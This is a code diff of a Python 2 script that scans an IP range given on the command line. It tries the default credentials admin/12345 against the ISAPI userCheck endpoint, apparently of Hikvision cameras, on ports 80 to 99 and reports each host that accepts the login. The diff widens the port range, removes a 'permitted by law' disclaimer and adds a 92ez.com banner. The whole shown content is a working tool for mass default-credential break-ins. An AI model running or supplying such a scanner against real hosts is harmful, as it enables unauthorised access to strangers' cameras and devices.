@@ -54,35 +54,31 @@ class tThread(threading.Thread):
             except:
                 continue
 
-def getinfo(hostinfo):
-
-    host = hostinfo[0]
-    index = hostinfo[1]
+def getinfo(host):
     username = "admin"
     password = "12345"
     timeout = 5
 
-    for k in range(0,9):
-        port = '8' + str(k)
+    for port in range(80,100):
         try:
-            req = requests.get(url='http://'+ username +':'+ password +'@'+ host +':'+ port +'/ISAPI/Security/userCheck',timeout=timeout)
+            req = requests.get(url='http://'+ username +':'+ password +'@'+ host +':'+ str(port) +'/ISAPI/Security/userCheck',timeout=timeout)
             result = req.text
             status = re.findall(r'<statusValue>(.*)</statusValue>', result)
             if status[0] == '200':
-                print 'Host http://'+ host +':'+ port +' Login Success!'
+                print 'Host http://'+ host +':'+ str(port) +' Login Success!'
         except:
             pass
 
 if __name__ == '__main__':
-    print 'Just make a test in the extent permitted by law  (^_^)'
+    print '=========================================='
+    print '=================92ez.com================='
+    print '=========================================='
 
     startIp = sys.argv[1].split('-')[0]
     endIp = sys.argv[1].split('-')[1]
     iplist = ip_range(startIp, endIp)
 
-    global TOTALIP
-    TOTALIP = len(iplist)
-    print '\n[Note] Total '+str(TOTALIP)+" IP...\n"
+    print '\n[Note] Total '+str(len(iplist))+" IP...\n"
     print '[Note] Running...\n'
 
     bThread(iplist)
